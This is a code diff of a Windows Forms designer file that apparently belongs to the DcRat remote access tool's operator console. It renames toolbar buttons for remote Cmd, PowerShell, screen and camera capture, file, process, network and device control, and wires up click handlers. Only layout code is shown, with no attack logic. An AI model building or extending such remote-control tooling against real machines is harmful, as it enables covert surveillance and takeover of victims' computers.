@@ -32,14 +32,14 @@ namespace DcRat.ChildForms
             this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(childFormHome));
             this.toolStripMain = new System.Windows.Forms.ToolStrip();
-            this.toolStripButton1 = new System.Windows.Forms.ToolStripButton();
-            this.toolStripButton2 = new System.Windows.Forms.ToolStripButton();
-            this.toolStripButton3 = new System.Windows.Forms.ToolStripButton();
-            this.toolStripButton4 = new System.Windows.Forms.ToolStripButton();
-            this.toolStripButton5 = new System.Windows.Forms.ToolStripButton();
-            this.toolStripButton6 = new System.Windows.Forms.ToolStripButton();
-            this.toolStripButton7 = new System.Windows.Forms.ToolStripButton();
-            this.toolStripButton8 = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtoncmd = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtonpowershell = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtonscreen = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtoncamera = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtonfile = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtonprocess = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtonnetwork = new System.Windows.Forms.ToolStripButton();
+            this.toolStripButtondevice = new System.Windows.Forms.ToolStripButton();
             this.toolStripLabel2 = new System.Windows.Forms.ToolStripLabel();
             this.toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
             this.splitContainerHome = new System.Windows.Forms.SplitContainer();
@@ -61,14 +61,14 @@ namespace DcRat.ChildForms
             this.toolStripMain.BackColor = System.Drawing.SystemColors.ControlLight;
             this.toolStripMain.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.toolStripMain.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.toolStripButton1,
-            this.toolStripButton2,
-            this.toolStripButton3,
-            this.toolStripButton4,
-            this.toolStripButton5,
-            this.toolStripButton6,
-            this.toolStripButton7,
-            this.toolStripButton8,
+            this.toolStripButtoncmd,
+            this.toolStripButtonpowershell,
+            this.toolStripButtonscreen,
+            this.toolStripButtoncamera,
+            this.toolStripButtonfile,
+            this.toolStripButtonprocess,
+            this.toolStripButtonnetwork,
+            this.toolStripButtondevice,
             this.toolStripLabel2,
             this.toolStripLabel1});
             this.toolStripMain.Location = new System.Drawing.Point(0, 0);
@@ -77,101 +77,107 @@ namespace DcRat.ChildForms
             this.toolStripMain.TabIndex = 0;
             this.toolStripMain.Text = "toolStrip1";
             // 
-            // toolStripButton1
+            // toolStripButtoncmd
             // 
-            this.toolStripButton1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton1.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton1.Image")));
-            this.toolStripButton1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton1.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton1.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton1.Name = "toolStripButton1";
-            this.toolStripButton1.Size = new System.Drawing.Size(36, 42);
-            this.toolStripButton1.Text = "Cmd";
+            this.toolStripButtoncmd.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtoncmd.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtoncmd.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtoncmd.Image")));
+            this.toolStripButtoncmd.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtoncmd.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtoncmd.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtoncmd.Name = "toolStripButtoncmd";
+            this.toolStripButtoncmd.Size = new System.Drawing.Size(36, 42);
+            this.toolStripButtoncmd.Text = "Cmd";
+            this.toolStripButtoncmd.Click += new System.EventHandler(this.toolStripButtoncmd_Click);
             // 
-            // toolStripButton2
+            // toolStripButtonpowershell
             // 
-            this.toolStripButton2.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton2.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton2.Image")));
-            this.toolStripButton2.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton2.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton2.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton2.Name = "toolStripButton2";
-            this.toolStripButton2.Size = new System.Drawing.Size(36, 42);
-            this.toolStripButton2.Text = "Powershell";
+            this.toolStripButtonpowershell.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtonpowershell.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtonpowershell.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonpowershell.Image")));
+            this.toolStripButtonpowershell.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtonpowershell.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtonpowershell.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtonpowershell.Name = "toolStripButtonpowershell";
+            this.toolStripButtonpowershell.Size = new System.Drawing.Size(36, 42);
+            this.toolStripButtonpowershell.Text = "Powershell";
+            this.toolStripButtonpowershell.Click += new System.EventHandler(this.toolStripButtonpowershell_Click);
             // 
-            // toolStripButton3
+            // toolStripButtonscreen
             // 
-            this.toolStripButton3.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton3.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton3.Image")));
-            this.toolStripButton3.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton3.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton3.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton3.Name = "toolStripButton3";
-            this.toolStripButton3.Size = new System.Drawing.Size(36, 42);
-            this.toolStripButton3.Text = "Screen";
+            this.toolStripButtonscreen.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtonscreen.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtonscreen.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonscreen.Image")));
+            this.toolStripButtonscreen.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtonscreen.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtonscreen.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtonscreen.Name = "toolStripButtonscreen";
+            this.toolStripButtonscreen.Size = new System.Drawing.Size(36, 42);
+            this.toolStripButtonscreen.Text = "Screen";
+            this.toolStripButtonscreen.Click += new System.EventHandler(this.toolStripButtonscreen_Click);
             // 
-            // toolStripButton4
+            // toolStripButtoncamera
             // 
-            this.toolStripButton4.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton4.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton4.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton4.Image")));
-            this.toolStripButton4.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton4.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton4.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton4.Name = "toolStripButton4";
-            this.toolStripButton4.Size = new System.Drawing.Size(36, 42);
-            this.toolStripButton4.Text = "Camera";
+            this.toolStripButtoncamera.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtoncamera.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtoncamera.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtoncamera.Image")));
+            this.toolStripButtoncamera.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtoncamera.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtoncamera.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtoncamera.Name = "toolStripButtoncamera";
+            this.toolStripButtoncamera.Size = new System.Drawing.Size(36, 42);
+            this.toolStripButtoncamera.Text = "Camera";
+            this.toolStripButtoncamera.Click += new System.EventHandler(this.toolStripButtoncamera_Click);
             // 
-            // toolStripButton5
+            // toolStripButtonfile
             // 
-            this.toolStripButton5.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton5.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton5.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton5.Image")));
-            this.toolStripButton5.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton5.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton5.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton5.Name = "toolStripButton5";
-            this.toolStripButton5.Size = new System.Drawing.Size(36, 42);
-            this.toolStripButton5.Text = "File";
+            this.toolStripButtonfile.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtonfile.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtonfile.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonfile.Image")));
+            this.toolStripButtonfile.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtonfile.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtonfile.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtonfile.Name = "toolStripButtonfile";
+            this.toolStripButtonfile.Size = new System.Drawing.Size(36, 42);
+            this.toolStripButtonfile.Text = "File";
+            this.toolStripButtonfile.Click += new System.EventHandler(this.toolStripButtonfile_Click);
             // 
-            // toolStripButton6
+            // toolStripButtonprocess
             // 
-            this.toolStripButton6.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton6.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton6.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton6.Image")));
-            this.toolStripButton6.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton6.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton6.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton6.Name = "toolStripButton6";
-            this.toolStripButton6.Size = new System.Drawing.Size(36, 42);
-            this.toolStripButton6.Text = "Process";
+            this.toolStripButtonprocess.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtonprocess.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtonprocess.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonprocess.Image")));
+            this.toolStripButtonprocess.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtonprocess.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtonprocess.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtonprocess.Name = "toolStripButtonprocess";
+            this.toolStripButtonprocess.Size = new System.Drawing.Size(36, 42);
+            this.toolStripButtonprocess.Text = "Process";
+            this.toolStripButtonprocess.Click += new System.EventHandler(this.toolStripButtonprocess_Click);
             // 
-            // toolStripButton7
+            // toolStripButtonnetwork
             // 
-            this.toolStripButton7.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton7.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton7.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton7.Image")));
-            this.toolStripButton7.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton7.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton7.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton7.Name = "toolStripButton7";
-            this.toolStripButton7.Size = new System.Drawing.Size(36, 42);
-            this.toolStripButton7.Text = "Network";
+            this.toolStripButtonnetwork.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtonnetwork.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtonnetwork.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonnetwork.Image")));
+            this.toolStripButtonnetwork.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtonnetwork.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtonnetwork.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtonnetwork.Name = "toolStripButtonnetwork";
+            this.toolStripButtonnetwork.Size = new System.Drawing.Size(36, 42);
+            this.toolStripButtonnetwork.Text = "Network";
             // 
-            // toolStripButton8
+            // toolStripButtondevice
             // 
-            this.toolStripButton8.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
-            this.toolStripButton8.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.toolStripButton8.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton8.Image")));
-            this.toolStripButton8.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
-            this.toolStripButton8.ImageTransparentColor = System.Drawing.Color.Magenta;
-            this.toolStripButton8.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
-            this.toolStripButton8.Name = "toolStripButton8";
-            this.toolStripButton8.Size = new System.Drawing.Size(43, 42);
-            this.toolStripButton8.Text = "Device";
+            this.toolStripButtondevice.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.toolStripButtondevice.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.toolStripButtondevice.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtondevice.Image")));
+            this.toolStripButtondevice.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
+            this.toolStripButtondevice.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.toolStripButtondevice.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
+            this.toolStripButtondevice.Name = "toolStripButtondevice";
+            this.toolStripButtondevice.Size = new System.Drawing.Size(43, 42);
+            this.toolStripButtondevice.Text = "Device";
             // 
             // toolStripLabel2
             // 
@@ -278,18 +284,18 @@ namespace DcRat.ChildForms
         #endregion
 
         private System.Windows.Forms.ToolStrip toolStripMain;
-        private System.Windows.Forms.ToolStripButton toolStripButton1;
-        private System.Windows.Forms.ToolStripButton toolStripButton2;
-        private System.Windows.Forms.ToolStripButton toolStripButton3;
-        private System.Windows.Forms.ToolStripButton toolStripButton4;
-        private System.Windows.Forms.ToolStripButton toolStripButton5;
-        private System.Windows.Forms.ToolStripButton toolStripButton6;
+        private System.Windows.Forms.ToolStripButton toolStripButtoncmd;
+        private System.Windows.Forms.ToolStripButton toolStripButtonpowershell;
+        private System.Windows.Forms.ToolStripButton toolStripButtonscreen;
+        private System.Windows.Forms.ToolStripButton toolStripButtoncamera;
+        private System.Windows.Forms.ToolStripButton toolStripButtonfile;
+        private System.Windows.Forms.ToolStripButton toolStripButtonprocess;
         private System.Windows.Forms.SplitContainer splitContainerHome;
         private System.Windows.Forms.ListView listView1;
         private System.Windows.Forms.ColumnHeader columnHeaderip;
         private System.Windows.Forms.RichTextBox richTextBox1;
-        private System.Windows.Forms.ToolStripButton toolStripButton7;
-        private System.Windows.Forms.ToolStripButton toolStripButton8;
+        private System.Windows.Forms.ToolStripButton toolStripButtonnetwork;
+        private System.Windows.Forms.ToolStripButton toolStripButtondevice;
         private System.Windows.Forms.ContextMenuStrip contextMenuStripMain;
         private System.Windows.Forms.ToolStripLabel toolStripLabel2;
         private System.Windows.Forms.ToolStripLabel toolStripLabel1;
